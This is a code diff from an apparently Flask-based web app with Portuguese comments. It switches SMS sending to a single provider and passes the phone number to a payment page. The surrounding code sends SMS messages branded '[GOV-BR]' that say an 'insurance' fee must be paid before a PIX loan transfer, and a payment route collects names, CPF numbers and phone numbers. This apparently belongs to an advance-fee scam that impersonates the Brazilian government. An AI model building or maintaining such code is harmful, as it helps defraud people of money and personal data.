@@ -196,11 +196,9 @@ def send_verification_code(phone_number: str) -> tuple:
             app.logger.error(f"Invalid phone number format: {phone_number}")
             return False, "Número de telefone inválido (deve conter DDD + 9 dígitos)"
 
-        # Choose which API to use based on SMS_API_CHOICE
-        if SMS_API_CHOICE.upper() == 'OWEN':
-            success, error = send_verification_code_owen(phone_number, verification_code)
-        else:  # Default to SMSDEV
-            success, error = send_verification_code_smsdev(phone_number, verification_code)
+        # Usar exclusivamente a API SMSDEV conforme solicitado
+        app.logger.info(f"[PROD] Usando exclusivamente a API SMSDEV para enviar código de verificação")
+        success, error = send_verification_code_smsdev(phone_number, verification_code)
 
         if success:
             return True, verification_code
@@ -337,11 +335,9 @@ def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
         # Message template
         message = f"[GOV-BR] {first_name}, estamos aguardando o pagamento do seguro no valor R${amount:.2f} para realizar a transferencia PIX do emprestimo para a sua conta bancaria."
 
-        # Choose which API to use based on SMS_API_CHOICE
-        if SMS_API_CHOICE.upper() == 'OWEN':
-            return send_sms_owen(phone_number, message)
-        else:  # Default to SMSDEV
-            return send_sms_smsdev(phone_number, message)
+        # Usar exclusivamente a API SMSDEV conforme solicitado
+        app.logger.info(f"[PROD] Usando exclusivamente a API SMSDEV para enviar SMS")
+        return send_sms_smsdev(phone_number, message)
     except Exception as e:
         app.logger.error(f"Error in send_sms: {str(e)}")
         return False
@@ -536,6 +532,7 @@ def payment():
                          pix_code=pix_code, 
                          nome=nome, 
                          cpf=format_cpf(cpf),
+                         phone=phone,  # Adicionando o telefone para o template
                          transaction_id=pix_data.get('id'),
                          amount=amount)
 
